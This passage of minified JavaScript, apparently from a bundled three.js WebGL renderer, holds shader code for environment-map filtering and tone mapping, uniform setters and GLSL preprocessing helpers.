		`,blending:Mi,depthTest:!1,depthWrite:!1})}function Y1(t,e,n){const i=new Float32Array(Ms),s=new H(0,1,0);return new di({name:"SphericalGaussianBlur",defines:{n:Ms,CUBEUV_TEXEL_WIDTH:1/e,CUBEUV_TEXEL_HEIGHT:1/n,CUBEUV_MAX_MIP:`${t}.0`},uniforms:{envMap:{value:null},samples:{value:1},weights:{value:i},latitudinal:{value:!1},dTheta:{value:0},mipInt:{value:0},poleAxis:{value:s}},vertexShader:nc(),fragmentShader:`

			precision mediump float;
			precision mediump int;

			varying vec3 vOutputDirection;

			uniform sampler2D envMap;
			uniform int samples;
			uniform float weights[ n ];
			uniform bool latitudinal;
			uniform float dTheta;
			uniform float mipInt;
			uniform vec3 poleAxis;

			#define ENVMAP_TYPE_CUBE_UV
			#include <cube_uv_reflection_fragment>

			vec3 getSample( float theta, vec3 axis ) {

				float cosTheta = cos( theta );
				// Rodrigues' axis-angle rotation
				vec3 sampleDirection = vOutputDirection * cosTheta
					+ cross( axis, vOutputDirection ) * sin( theta )
					+ axis * dot( axis, vOutputDirection ) * ( 1.0 - cosTheta );

				return bilinearCubeUV( envMap, sampleDirection, mipInt );

			}

			void main() {

				vec3 axis = latitudinal ? poleAxis : cross( poleAxis, vOutputDirection );

				if ( all( equal( axis, vec3( 0.0 ) ) ) ) {

					axis = vec3( vOutputDirection.z, 0.0, - vOutputDirection.x );

				}

				axis = normalize( axis );

				gl_FragColor = vec4( 0.0, 0.0, 0.0, 1.0 );
				gl_FragColor.rgb += weights[ 0 ] * getSample( 0.0, axis );

				for ( int i = 1; i < n; i++ ) {

					if ( i >= samples ) {

						break;

					}

					float theta = dTheta * float( i );
					gl_FragColor.rgb += weights[ i ] * getSample( -1.0 * theta, axis );
					gl_FragColor.rgb += weights[ i ] * getSample( theta, axis );

				}

			}
		`,blending:Mi,depthTest:!1,depthWrite:!1})}function Em(){return new di({name:"EquirectangularToCubeUV",uniforms:{envMap:{value:null}},vertexShader:nc(),fragmentShader:`

			precision mediump float;
			precision mediump int;

			varying vec3 vOutputDirection;

			uniform sampler2D envMap;

			#include <common>

			void main() {

				vec3 outputDirection = normalize( vOutputDirection );
				vec2 uv = equirectUv( outputDirection );

				gl_FragColor = vec4( texture2D ( envMap, uv ).rgb, 1.0 );

			}
		`,blending:Mi,depthTest:!1,depthWrite:!1})}function Mm(){return new di({name:"CubemapToCubeUV",uniforms:{envMap:{value:null},flipEnvMap:{value:-1}},vertexShader:nc(),fragmentShader:`

			precision mediump float;
			precision mediump int;

			uniform float flipEnvMap;

			varying vec3 vOutputDirection;

			uniform samplerCube envMap;

			void main() {

				gl_FragColor = textureCube( envMap, vec3( flipEnvMap * vOutputDirection.x, vOutputDirection.yz ) );

			}
		`,blending:Mi,depthTest:!1,depthWrite:!1})}function nc(){return`

		precision mediump float;
		precision mediump int;

		attribute float faceIndex;

		varying vec3 vOutputDirection;

		// RH coordinate system; PMREM face-indexing convention
		vec3 getDirection( vec2 uv, float face ) {

			uv = 2.0 * uv - 1.0;

			vec3 direction = vec3( uv, 1.0 );

			if ( face == 0.0 ) {

				direction = direction.zyx; // ( 1, v, u ) pos x

			} else if ( face == 1.0 ) {

				direction = direction.xzy;
				direction.xz *= -1.0; // ( -u, 1, -v ) pos y

			} else if ( face == 2.0 ) {

				direction.x *= -1.0; // ( -u, v, 1 ) pos z

			} else if ( face == 3.0 ) {

				direction = direction.zyx;
				direction.xz *= -1.0; // ( -1, v, -u ) neg x

			} else if ( face == 4.0 ) {

				direction = direction.xzy;
				direction.xy *= -1.0; // ( -u, -1, v ) neg y

			} else if ( face == 5.0 ) {

				direction.z *= -1.0; // ( u, v, -1 ) neg z

			}

			return direction;

		}

		void main() {

			vOutputDirection = getDirection( uv, faceIndex );
			gl_Position = vec4( position, 1.0 );

		}
	`}function $1(t){let e=new WeakMap,n=null;function i(o){if(o&&o.isTexture){const l=o.mapping,c=l===_d||l===xd,p=l===Fs||l===Nr;if(c||p){let d=e.get(o);const h=d!==void 0?d.texture.pmremVersion:0;if(o.isRenderTargetTexture&&o.pmremVersion!==h)return n===null&&(n=new bm(t)),d=c?n.fromEquirectangular(o,d):n.fromCubemap(o,d),d.texture.pmremVersion=o.pmremVersion,e.set(o,d),d.texture;if(d!==void 0)return d.texture;{const f=o.image;return c&&f&&f.height>0||p&&f&&s(f)?(n===null&&(n=new bm(t)),d=c?n.fromEquirectangular(o):n.fromCubemap(o),d.texture.pmremVersion=o.pmremVersion,e.set(o,d),o.addEventListener("dispose",r),d.texture):null}}}return o}function s(o){let l=0;const c=6;for(let p=0;p<c;p++)o[p]!==void 0&&l++;return l===c}function r(o){const l=o.target;l.removeEventListener("dispose",r);const c=e.get(l);c!==void 0&&(e.delete(l),c.dispose())}function a(){e=new WeakMap,n!==null&&(n.dispose(),n=null)}return{get:i,dispose:a}}function K1(t){const e={};function n(i){if(e[i]!==void 0)return e[i];const s=t.getExtension(i);return e[i]=s,s}return{has:function(i){return n(i)!==null},init:function(){n("EXT_color_buffer_float"),n("WEBGL_clip_cull_distance"),n("OES_texture_float_linear"),n("EXT_color_buffer_half_float"),n("WEBGL_multisampled_render_to_texture"),n("WEBGL_render_shared_exponent")},get:function(i){const s=n(i);return s===null&&Wa("WebGLRenderer: "+i+" extension not supported."),s}}}function Z1(t,e,n,i){const s={},r=new WeakMap;function a(d){const h=d.target;h.index!==null&&e.remove(h.index);for(const v in h.attributes)e.remove(h.attributes[v]);h.removeEventListener("dispose",a),delete s[h.id];const f=r.get(h);f&&(e.remove(f),r.delete(h)),i.releaseStatesOfGeometry(h),h.isInstancedBufferGeometry===!0&&delete h._maxInstanceCount,n.memory.geometries--}function o(d,h){return s[h.id]===!0||(h.addEventListener("dispose",a),s[h.id]=!0,n.memory.geometries++),h}function l(d){const h=d.attributes;for(const f in h)e.update(h[f],t.ARRAY_BUFFER)}function c(d){const h=[],f=d.index,v=d.attributes.position;let y=0;if(f!==null){const g=f.array;y=f.version;for(let _=0,b=g.length;_<b;_+=3){const T=g[_+0],A=g[_+1],C=g[_+2];h.push(T,A,A,C,C,T)}}else if(v!==void 0){const g=v.array;y=v.version;for(let _=0,b=g.length/3-1;_<b;_+=3){const T=_+0,A=_+1,C=_+2;h.push(T,A,A,C,C,T)}}else return;const m=new(B0(h)?W0:G0)(h,1);m.version=y;const u=r.get(d);u&&e.remove(u),r.set(d,m)}function p(d){const h=r.get(d);if(h){const f=d.index;f!==null&&h.version<f.version&&c(d)}else c(d);return r.get(d)}return{get:o,update:l,getWireframeAttribute:p}}function J1(t,e,n){let i;function s(h){i=h}let r,a;function o(h){r=h.type,a=h.bytesPerElement}function l(h,f){t.drawElements(i,f,r,h*a),n.update(f,i,1)}function c(h,f,v){v!==0&&(t.drawElementsInstanced(i,f,r,h*a,v),n.update(f,i,v))}function p(h,f,v){if(v===0)return;e.get("WEBGL_multi_draw").multiDrawElementsWEBGL(i,f,0,r,h,0,v);let m=0;for(let u=0;u<v;u++)m+=f[u];n.update(m,i,1)}function d(h,f,v,y){if(v===0)return;const m=e.get("WEBGL_multi_draw");if(m===null)for(let u=0;u<h.length;u++)c(h[u]/a,f[u],y[u]);else{m.multiDrawElementsInstancedWEBGL(i,f,0,r,h,0,y,0,v);let u=0;for(let g=0;g<v;g++)u+=f[g]*y[g];n.update(u,i,1)}}this.setMode=s,this.setIndex=o,this.render=l,this.renderInstances=c,this.renderMultiDraw=p,this.renderMultiDrawInstances=d}function Q1(t){const e={geometries:0,textures:0},n={frame:0,calls:0,triangles:0,points:0,lines:0};function i(r,a,o){switch(n.calls++,a){case t.TRIANGLES:n.triangles+=o*(r/3);break;case t.LINES:n.lines+=o*(r/2);break;case t.LINE_STRIP:n.lines+=o*(r-1);break;case t.LINE_LOOP:n.lines+=o*r;break;case t.POINTS:n.points+=o*r;break;default:$e("WebGLInfo: Unknown draw mode:",a);break}}function s(){n.calls=0,n.triangles=0,n.points=0,n.lines=0}return{memory:e,render:n,programs:null,autoReset:!0,reset:s,update:i}}function eT(t,e,n){const i=new WeakMap,s=new St;function r(a,o,l){const c=a.morphTargetInfluences,p=o.morphAttributes.position||o.morphAttributes.normal||o.morphAttributes.color,d=p!==void 0?p.length:0;let h=i.get(o);if(h===void 0||h.count!==d){let E=function(){L.dispose(),i.delete(o),o.removeEventListener("dispose",E)};var f=E;h!==void 0&&h.texture.dispose();const v=o.morphAttributes.position!==void 0,y=o.morphAttributes.normal!==void 0,m=o.morphAttributes.color!==void 0,u=o.morphAttributes.position||[],g=o.morphAttributes.normal||[],_=o.morphAttributes.color||[];let b=0;v===!0&&(b=1),y===!0&&(b=2),m===!0&&(b=3);let T=o.attributes.position.count*b,A=1;T>e.maxTextureSize&&(A=Math.ceil(T/e.maxTextureSize),T=e.maxTextureSize);const C=new Float32Array(T*A*4*d),L=new z0(C,T,A,d);L.type=ni,L.needsUpdate=!0;const w=b*4;for(let P=0;P<d;P++){const G=u[P],V=g[P],Z=_[P],O=T*A*4*P;for(let z=0;z<G.count;z++){const F=z*w;v===!0&&(s.fromBufferAttribute(G,z),C[O+F+0]=s.x,C[O+F+1]=s.y,C[O+F+2]=s.z,C[O+F+3]=0),y===!0&&(s.fromBufferAttribute(V,z),C[O+F+4]=s.x,C[O+F+5]=s.y,C[O+F+6]=s.z,C[O+F+7]=0),m===!0&&(s.fromBufferAttribute(Z,z),C[O+F+8]=s.x,C[O+F+9]=s.y,C[O+F+10]=s.z,C[O+F+11]=Z.itemSize===4?s.w:1)}}h={count:d,texture:L,size:new Ze(T,A)},i.set(o,h),o.addEventListener("dispose",E)}if(a.isInstancedMesh===!0&&a.morphTexture!==null)l.getUniforms().setValue(t,"morphTexture",a.morphTexture,n);else{let v=0;for(let m=0;m<c.length;m++)v+=c[m];const y=o.morphTargetsRelative?1:1-v;l.getUniforms().setValue(t,"morphTargetBaseInfluence",y),l.getUniforms().setValue(t,"morphTargetInfluences",c)}l.getUniforms().setValue(t,"morphTargetsTexture",h.texture,n),l.getUniforms().setValue(t,"morphTargetsTextureSize",h.size)}return{update:r}}function tT(t,e,n,i){let s=new WeakMap;function r(l){const c=i.render.frame,p=l.geometry,d=e.get(l,p);if(s.get(d)!==c&&(e.update(d),s.set(d,c)),l.isInstancedMesh&&(l.hasEventListener("dispose",o)===!1&&l.addEventListener("dispose",o),s.get(l)!==c&&(n.update(l.instanceMatrix,t.ARRAY_BUFFER),l.instanceColor!==null&&n.update(l.instanceColor,t.ARRAY_BUFFER),s.set(l,c))),l.isSkinnedMesh){const h=l.skeleton;s.get(h)!==c&&(h.update(),s.set(h,c))}return d}function a(){s=new WeakMap}function o(l){const c=l.target;c.removeEventListener("dispose",o),n.remove(c.instanceMatrix),c.instanceColor!==null&&n.remove(c.instanceColor)}return{update:r,dispose:a}}const nT={[w0]:"LINEAR_TONE_MAPPING",[E0]:"REINHARD_TONE_MAPPING",[M0]:"CINEON_TONE_MAPPING",[T0]:"ACES_FILMIC_TONE_MAPPING",[C0]:"AGX_TONE_MAPPING",[R0]:"NEUTRAL_TONE_MAPPING",[A0]:"CUSTOM_TONE_MAPPING"};function iT(t,e,n,i,s){const r=new oi(e,n,{type:t,depthBuffer:i,stencilBuffer:s}),a=new oi(e,n,{type:ki,depthBuffer:!1,stencilBuffer:!1}),o=new $n;o.setAttribute("position",new tn([-1,3,0,-1,-1,0,3,-1,0],3)),o.setAttribute("uv",new tn([0,2,0,0,2,0],2));const l=new jw({uniforms:{tDiffuse:{value:null}},vertexShader:`
			precision highp float;

			uniform mat4 modelViewMatrix;
			uniform mat4 projectionMatrix;

			attribute vec3 position;
			attribute vec2 uv;

			varying vec2 vUv;

			void main() {
				vUv = uv;
				gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );
			}`,fragmentShader:`
			precision highp float;

			uniform sampler2D tDiffuse;

			varying vec2 vUv;

			#include <tonemapping_pars_fragment>
			#include <colorspace_pars_fragment>

			void main() {
				gl_FragColor = texture2D( tDiffuse, vUv );

				#ifdef LINEAR_TONE_MAPPING
					gl_FragColor.rgb = LinearToneMapping( gl_FragColor.rgb );
				#elif defined( REINHARD_TONE_MAPPING )
					gl_FragColor.rgb = ReinhardToneMapping( gl_FragColor.rgb );
				#elif defined( CINEON_TONE_MAPPING )
					gl_FragColor.rgb = CineonToneMapping( gl_FragColor.rgb );
				#elif defined( ACES_FILMIC_TONE_MAPPING )
					gl_FragColor.rgb = ACESFilmicToneMapping( gl_FragColor.rgb );
				#elif defined( AGX_TONE_MAPPING )
					gl_FragColor.rgb = AgXToneMapping( gl_FragColor.rgb );
				#elif defined( NEUTRAL_TONE_MAPPING )
					gl_FragColor.rgb = NeutralToneMapping( gl_FragColor.rgb );
				#elif defined( CUSTOM_TONE_MAPPING )
					gl_FragColor.rgb = CustomToneMapping( gl_FragColor.rgb );
				#endif

				#ifdef SRGB_TRANSFER
					gl_FragColor = sRGBTransferOETF( gl_FragColor );
				#endif
			}`,depthTest:!1,depthWrite:!1}),c=new Nn(o,l),p=new fh(-1,1,1,-1,0,1);let d=null,h=null,f=!1,v,y=null,m=[],u=!1;this.setSize=function(g,_){r.setSize(g,_),a.setSize(g,_);for(let b=0;b<m.length;b++){const T=m[b];T.setSize&&T.setSize(g,_)}},this.setEffects=function(g){m=g,u=m.length>0&&m[0].isRenderPass===!0;const _=r.width,b=r.height;for(let T=0;T<m.length;T++){const A=m[T];A.setSize&&A.setSize(_,b)}},this.begin=function(g,_){if(f||g.toneMapping===ai&&m.length===0)return!1;if(y=_,_!==null){const b=_.width,T=_.height;(r.width!==b||r.height!==T)&&this.setSize(b,T)}return u===!1&&g.setRenderTarget(r),v=g.toneMapping,g.toneMapping=ai,!0},this.hasRenderPass=function(){return u},this.end=function(g,_){g.toneMapping=v,f=!0;let b=r,T=a;for(let A=0;A<m.length;A++){const C=m[A];if(C.enabled!==!1&&(C.render(g,T,b,_),C.needsSwap!==!1)){const L=b;b=T,T=L}}if(d!==g.outputColorSpace||h!==g.toneMapping){d=g.outputColorSpace,h=g.toneMapping,l.defines={},We.getTransfer(d)===it&&(l.defines.SRGB_TRANSFER="");const A=nT[h];A&&(l.defines[A]=""),l.needsUpdate=!0}l.uniforms.tDiffuse.value=b.texture,g.setRenderTarget(y),g.render(c,p),y=null,f=!1},this.isCompositing=function(){return f},this.dispose=function(){r.dispose(),a.dispose(),o.dispose(),l.dispose()}}const J0=new Yt,ep=new ja(1,1),Q0=new z0,e_=new xw,t_=new q0,Tm=[],Am=[],Cm=new Float32Array(16),Rm=new Float32Array(9),Pm=new Float32Array(4);function Hr(t,e,n){const i=t[0];if(i<=0||i>0)return t;const s=e*n;let r=Tm[s];if(r===void 0&&(r=new Float32Array(s),Tm[s]=r),e!==0){i.toArray(r,0);for(let a=1,o=0;a!==e;++a)o+=n,t[a].toArray(r,o)}return r}function kt(t,e){if(t.length!==e.length)return!1;for(let n=0,i=t.length;n<i;n++)if(t[n]!==e[n])return!1;return!0}function Lt(t,e){for(let n=0,i=e.length;n<i;n++)t[n]=e[n]}function ic(t,e){let n=Am[e];n===void 0&&(n=new Int32Array(e),Am[e]=n);for(let i=0;i!==e;++i)n[i]=t.allocateTextureUnit();return n}function sT(t,e){const n=this.cache;n[0]!==e&&(t.uniform1f(this.addr,e),n[0]=e)}function rT(t,e){const n=this.cache;if(e.x!==void 0)(n[0]!==e.x||n[1]!==e.y)&&(t.uniform2f(this.addr,e.x,e.y),n[0]=e.x,n[1]=e.y);else{if(kt(n,e))return;t.uniform2fv(this.addr,e),Lt(n,e)}}function aT(t,e){const n=this.cache;if(e.x!==void 0)(n[0]!==e.x||n[1]!==e.y||n[2]!==e.z)&&(t.uniform3f(this.addr,e.x,e.y,e.z),n[0]=e.x,n[1]=e.y,n[2]=e.z);else if(e.r!==void 0)(n[0]!==e.r||n[1]!==e.g||n[2]!==e.b)&&(t.uniform3f(this.addr,e.r,e.g,e.b),n[0]=e.r,n[1]=e.g,n[2]=e.b);else{if(kt(n,e))return;t.uniform3fv(this.addr,e),Lt(n,e)}}function oT(t,e){const n=this.cache;if(e.x!==void 0)(n[0]!==e.x||n[1]!==e.y||n[2]!==e.z||n[3]!==e.w)&&(t.uniform4f(this.addr,e.x,e.y,e.z,e.w),n[0]=e.x,n[1]=e.y,n[2]=e.z,n[3]=e.w);else{if(kt(n,e))return;t.uniform4fv(this.addr,e),Lt(n,e)}}function lT(t,e){const n=this.cache,i=e.elements;if(i===void 0){if(kt(n,e))return;t.uniformMatrix2fv(this.addr,!1,e),Lt(n,e)}else{if(kt(n,i))return;Pm.set(i),t.uniformMatrix2fv(this.addr,!1,Pm),Lt(n,i)}}function cT(t,e){const n=this.cache,i=e.elements;if(i===void 0){if(kt(n,e))return;t.uniformMatrix3fv(this.addr,!1,e),Lt(n,e)}else{if(kt(n,i))return;Rm.set(i),t.uniformMatrix3fv(this.addr,!1,Rm),Lt(n,i)}}function uT(t,e){const n=this.cache,i=e.elements;if(i===void 0){if(kt(n,e))return;t.uniformMatrix4fv(this.addr,!1,e),Lt(n,e)}else{if(kt(n,i))return;Cm.set(i),t.uniformMatrix4fv(this.addr,!1,Cm),Lt(n,i)}}function dT(t,e){const n=this.cache;n[0]!==e&&(t.uniform1i(this.addr,e),n[0]=e)}function pT(t,e){const n=this.cache;if(e.x!==void 0)(n[0]!==e.x||n[1]!==e.y)&&(t.uniform2i(this.addr,e.x,e.y),n[0]=e.x,n[1]=e.y);else{if(kt(n,e))return;t.uniform2iv(this.addr,e),Lt(n,e)}}function hT(t,e){const n=this.cache;if(e.x!==void 0)(n[0]!==e.x||n[1]!==e.y||n[2]!==e.z)&&(t.uniform3i(this.addr,e.x,e.y,e.z),n[0]=e.x,n[1]=e.y,n[2]=e.z);else{if(kt(n,e))return;t.uniform3iv(this.addr,e),Lt(n,e)}}function fT(t,e){const n=this.cache;if(e.x!==void 0)(n[0]!==e.x||n[1]!==e.y||n[2]!==e.z||n[3]!==e.w)&&(t.uniform4i(this.addr,e.x,e.y,e.z,e.w),n[0]=e.x,n[1]=e.y,n[2]=e.z,n[3]=e.w);else{if(kt(n,e))return;t.uniform4iv(this.addr,e),Lt(n,e)}}function mT(t,e){const n=this.cache;n[0]!==e&&(t.uniform1ui(this.addr,e),n[0]=e)}function gT(t,e){const n=this.cache;if(e.x!==void 0)(n[0]!==e.x||n[1]!==e.y)&&(t.uniform2ui(this.addr,e.x,e.y),n[0]=e.x,n[1]=e.y);else{if(kt(n,e))return;t.uniform2uiv(this.addr,e),Lt(n,e)}}function vT(t,e){const n=this.cache;if(e.x!==void 0)(n[0]!==e.x||n[1]!==e.y||n[2]!==e.z)&&(t.uniform3ui(this.addr,e.x,e.y,e.z),n[0]=e.x,n[1]=e.y,n[2]=e.z);else{if(kt(n,e))return;t.uniform3uiv(this.addr,e),Lt(n,e)}}function _T(t,e){const n=this.cache;if(e.x!==void 0)(n[0]!==e.x||n[1]!==e.y||n[2]!==e.z||n[3]!==e.w)&&(t.uniform4ui(this.addr,e.x,e.y,e.z,e.w),n[0]=e.x,n[1]=e.y,n[2]=e.z,n[3]=e.w);else{if(kt(n,e))return;t.uniform4uiv(this.addr,e),Lt(n,e)}}function xT(t,e,n){const i=this.cache,s=n.allocateTextureUnit();i[0]!==s&&(t.uniform1i(this.addr,s),i[0]=s);let r;this.type===t.SAMPLER_2D_SHADOW?(ep.compareFunction=n.isReversedDepthBuffer()?oh:ah,r=ep):r=J0,n.setTexture2D(e||r,s)}function yT(t,e,n){const i=this.cache,s=n.allocateTextureUnit();i[0]!==s&&(t.uniform1i(this.addr,s),i[0]=s),n.setTexture3D(e||e_,s)}function ST(t,e,n){const i=this.cache,s=n.allocateTextureUnit();i[0]!==s&&(t.uniform1i(this.addr,s),i[0]=s),n.setTextureCube(e||t_,s)}function bT(t,e,n){const i=this.cache,s=n.allocateTextureUnit();i[0]!==s&&(t.uniform1i(this.addr,s),i[0]=s),n.setTexture2DArray(e||Q0,s)}function wT(t){switch(t){case 5126:return sT;case 35664:return rT;case 35665:return aT;case 35666:return oT;case 35674:return lT;case 35675:return cT;case 35676:return uT;case 5124:case 35670:return dT;case 35667:case 35671:return pT;case 35668:case 35672:return hT;case 35669:case 35673:return fT;case 5125:return mT;case 36294:return gT;case 36295:return vT;case 36296:return _T;case 35678:case 36198:case 36298:case 36306:case 35682:return xT;case 35679:case 36299:case 36307:return yT;case 35680:case 36300:case 36308:case 36293:return ST;case 36289:case 36303:case 36311:case 36292:return bT}}function ET(t,e){t.uniform1fv(this.addr,e)}function MT(t,e){const n=Hr(e,this.size,2);t.uniform2fv(this.addr,n)}function TT(t,e){const n=Hr(e,this.size,3);t.uniform3fv(this.addr,n)}function AT(t,e){const n=Hr(e,this.size,4);t.uniform4fv(this.addr,n)}function CT(t,e){const n=Hr(e,this.size,4);t.uniformMatrix2fv(this.addr,!1,n)}function RT(t,e){const n=Hr(e,this.size,9);t.uniformMatrix3fv(this.addr,!1,n)}function PT(t,e){const n=Hr(e,this.size,16);t.uniformMatrix4fv(this.addr,!1,n)}function kT(t,e){t.uniform1iv(this.addr,e)}function LT(t,e){t.uniform2iv(this.addr,e)}function NT(t,e){t.uniform3iv(this.addr,e)}function IT(t,e){t.uniform4iv(this.addr,e)}function DT(t,e){t.uniform1uiv(this.addr,e)}function UT(t,e){t.uniform2uiv(this.addr,e)}function OT(t,e){t.uniform3uiv(this.addr,e)}function FT(t,e){t.uniform4uiv(this.addr,e)}function BT(t,e,n){const i=this.cache,s=e.length,r=ic(n,s);kt(i,r)||(t.uniform1iv(this.addr,r),Lt(i,r));let a;this.type===t.SAMPLER_2D_SHADOW?a=ep:a=J0;for(let o=0;o!==s;++o)n.setTexture2D(e[o]||a,r[o])}function zT(t,e,n){const i=this.cache,s=e.length,r=ic(n,s);kt(i,r)||(t.uniform1iv(this.addr,r),Lt(i,r));for(let a=0;a!==s;++a)n.setTexture3D(e[a]||e_,r[a])}function VT(t,e,n){const i=this.cache,s=e.length,r=ic(n,s);kt(i,r)||(t.uniform1iv(this.addr,r),Lt(i,r));for(let a=0;a!==s;++a)n.setTextureCube(e[a]||t_,r[a])}function HT(t,e,n){const i=this.cache,s=e.length,r=ic(n,s);kt(i,r)||(t.uniform1iv(this.addr,r),Lt(i,r));for(let a=0;a!==s;++a)n.setTexture2DArray(e[a]||Q0,r[a])}function GT(t){switch(t){case 5126:return ET;case 35664:return MT;case 35665:return TT;case 35666:return AT;case 35674:return CT;case 35675:return RT;case 35676:return PT;case 5124:case 35670:return kT;case 35667:case 35671:return LT;case 35668:case 35672:return NT;case 35669:case 35673:return IT;case 5125:return DT;case 36294:return UT;case 36295:return OT;case 36296:return FT;case 35678:case 36198:case 36298:case 36306:case 35682:return BT;case 35679:case 36299:case 36307:return zT;case 35680:case 36300:case 36308:case 36293:return VT;case 36289:case 36303:case 36311:case 36292:return HT}}class WT{constructor(e,n,i){this.id=e,this.addr=i,this.cache=[],this.type=n.type,this.setValue=wT(n.type)}}class jT{constructor(e,n,i){this.id=e,this.addr=i,this.cache=[],this.type=n.type,this.size=n.size,this.setValue=GT(n.type)}}class XT{constructor(e){this.id=e,this.seq=[],this.map={}}setValue(e,n,i){const s=this.seq;for(let r=0,a=s.length;r!==a;++r){const o=s[r];o.setValue(e,n[o.id],i)}}}const du=/(\w+)(\])?(\[|\.)?/g;function km(t,e){t.seq.push(e),t.map[e.id]=e}function qT(t,e,n){const i=t.name,s=i.length;for(du.lastIndex=0;;){const r=du.exec(i),a=du.lastIndex;let o=r[1];const l=r[2]==="]",c=r[3];if(l&&(o=o|0),c===void 0||c==="["&&a+2===s){km(n,c===void 0?new WT(o,t,e):new jT(o,t,e));break}else{let d=n.map[o];d===void 0&&(d=new XT(o),km(n,d)),n=d}}}class ol{constructor(e,n){this.seq=[],this.map={};const i=e.getProgramParameter(n,e.ACTIVE_UNIFORMS);for(let a=0;a<i;++a){const o=e.getActiveUniform(n,a),l=e.getUniformLocation(n,o.name);qT(o,l,this)}const s=[],r=[];for(const a of this.seq)a.type===e.SAMPLER_2D_SHADOW||a.type===e.SAMPLER_CUBE_SHADOW||a.type===e.SAMPLER_2D_ARRAY_SHADOW?s.push(a):r.push(a);s.length>0&&(this.seq=s.concat(r))}setValue(e,n,i,s){const r=this.map[n];r!==void 0&&r.setValue(e,i,s)}setOptional(e,n,i){const s=n[i];s!==void 0&&this.setValue(e,i,s)}static upload(e,n,i,s){for(let r=0,a=n.length;r!==a;++r){const o=n[r],l=i[o.id];l.needsUpdate!==!1&&o.setValue(e,l.value,s)}}static seqWithValue(e,n){const i=[];for(let s=0,r=e.length;s!==r;++s){const a=e[s];a.id in n&&i.push(a)}return i}}function Lm(t,e,n){const i=t.createShader(e);return t.shaderSource(i,n),t.compileShader(i),i}const YT=37297;let $T=0;function KT(t,e){const n=t.split(`
`),i=[],s=Math.max(e-6,0),r=Math.min(e+6,n.length);for(let a=s;a<r;a++){const o=a+1;i.push(`${o===e?">":" "} ${o}: ${n[a]}`)}return i.join(`
`)}const Nm=new Ue;function ZT(t){We._getMatrix(Nm,We.workingColorSpace,t);const e=`mat3( ${Nm.elements.map(n=>n.toFixed(4))} )`;switch(We.getTransfer(t)){case Nl:return[e,"LinearTransferOETF"];case it:return[e,"sRGBTransferOETF"];default:return Ie("WebGLProgram: Unsupported color space: ",t),[e,"LinearTransferOETF"]}}function Im(t,e,n){const i=t.getShaderParameter(e,t.COMPILE_STATUS),r=(t.getShaderInfoLog(e)||"").trim();if(i&&r==="")return"";const a=/ERROR: 0:(\d+)/.exec(r);if(a){const o=parseInt(a[1]);return n.toUpperCase()+`

`+r+`

`+KT(t.getShaderSource(e),o)}else return r}function JT(t,e){const n=ZT(e);return[`vec4 ${t}( vec4 value ) {`,`	return ${n[1]}( vec4( value.rgb * ${n[0]}, value.a ) );`,"}"].join(`
`)}const QT={[w0]:"Linear",[E0]:"Reinhard",[M0]:"Cineon",[T0]:"ACESFilmic",[C0]:"AgX",[R0]:"Neutral",[A0]:"Custom"};function eA(t,e){const n=QT[e];return n===void 0?(Ie("WebGLProgram: Unsupported toneMapping:",e),"vec3 "+t+"( vec3 color ) { return LinearToneMapping( color ); }"):"vec3 "+t+"( vec3 color ) { return "+n+"ToneMapping( color ); }"}const Go=new H;function tA(){We.getLuminanceCoefficients(Go);const t=Go.x.toFixed(4),e=Go.y.toFixed(4),n=Go.z.toFixed(4);return["float luminance( const in vec3 rgb ) {",`	const vec3 weights = vec3( ${t}, ${e}, ${n} );`,"	return dot( weights, rgb );","}"].join(`
`)}function nA(t){return[t.extensionClipCullDistance?"#extension GL_ANGLE_clip_cull_distance : require":"",t.extensionMultiDraw?"#extension GL_ANGLE_multi_draw : require":""].filter(da).join(`
`)}function iA(t){const e=[];for(const n in t){const i=t[n];i!==!1&&e.push("#define "+n+" "+i)}return e.join(`
`)}function sA(t,e){const n={},i=t.getProgramParameter(e,t.ACTIVE_ATTRIBUTES);for(let s=0;s<i;s++){const r=t.getActiveAttrib(e,s),a=r.name;let o=1;r.type===t.FLOAT_MAT2&&(o=2),r.type===t.FLOAT_MAT3&&(o=3),r.type===t.FLOAT_MAT4&&(o=4),n[a]={type:r.type,location:t.getAttribLocation(e,a),locationSize:o}}return n}function da(t){return t!==""}function Dm(t,e){const n=e.numSpotLightShadows+e.numSpotLightMaps-e.numSpotLightShadowsWithMaps;return t.replace(/NUM_DIR_LIGHTS/g,e.numDirLights).replace(/NUM_SPOT_LIGHTS/g,e.numSpotLights).replace(/NUM_SPOT_LIGHT_MAPS/g,e.numSpotLightMaps).replace(/NUM_SPOT_LIGHT_COORDS/g,n).replace(/NUM_RECT_AREA_LIGHTS/g,e.numRectAreaLights).replace(/NUM_POINT_LIGHTS/g,e.numPointLights).replace(/NUM_HEMI_LIGHTS/g,e.numHemiLights).replace(/NUM_DIR_LIGHT_SHADOWS/g,e.numDirLightShadows).replace(/NUM_SPOT_LIGHT_SHADOWS_WITH_MAPS/g,e.numSpotLightShadowsWithMaps).replace(/NUM_SPOT_LIGHT_SHADOWS/g,e.numSpotLightShadows).replace(/NUM_POINT_LIGHT_SHADOWS/g,e.numPointLightShadows)}function Um(t,e){return t.replace(/NUM_CLIPPING_PLANES/g,e.numClippingPlanes).replace(/UNION_CLIPPING_PLANES/g,e.numClippingPlanes-e.numClipIntersection)}const rA=/^[ \t]*#include +<([\w\d./]+)>/gm;function tp(t){return t.replace(rA,oA)}const aA=new Map;function oA(t,e){let n=Oe[e];if(n===void 0){const i=aA.get(e);if(i!==void 0)n=Oe[i],Ie('WebGLRenderer: Shader chunk "%s" has been deprecated. Use "%s" instead.',e,i);else throw new Error("Can not resolve #include <"+e+">")}return tp(n)}const lA=/#pragma unroll_loop_start\s+for\s*\(\s*int\s+i\s*=\s*(\d+)\s*;\s*i\s*<\s*(\d+)\s*;\s*i\s*\+\+\s*\)\s*{([\s\S]+?)}\s+#pragma unroll_loop_end/g;function Om(t){return t.replace(lA,cA)}function cA(t,e,n,i){let s="";for(let r=parseInt(e);r<parseInt(n);r++)s+=i.replace(/\[\s*i\s*\]/g,"[ "+r+" ]").replace(/UNROLLED_LOOP_INDEX/g,r);return s}function Fm(t){let e=`precision ${t.precision} float;
	precision ${t.precision} int;
	precision ${t.precision} sampler2D;
	precision ${t.precision} samplerCube;
	precision ${t.precision} sampler3D;
	precision ${t.precision} sampler2DArray;
	precision ${t.precision} sampler2DShadow;
	precision ${t.precision} samplerCubeShadow;
	precision ${t.precision} sampler2DArrayShadow;
	precision ${t.precision} isampler2D;
	precision ${t.precision} isampler3D;
	precision ${t.precision} isamplerCube;
	precision ${t.precision} isampler2DArray;
	precision ${t.precision} usampler2D;
	precision ${t.precision} usampler3D;
	precision ${t.precision} usamplerCube;
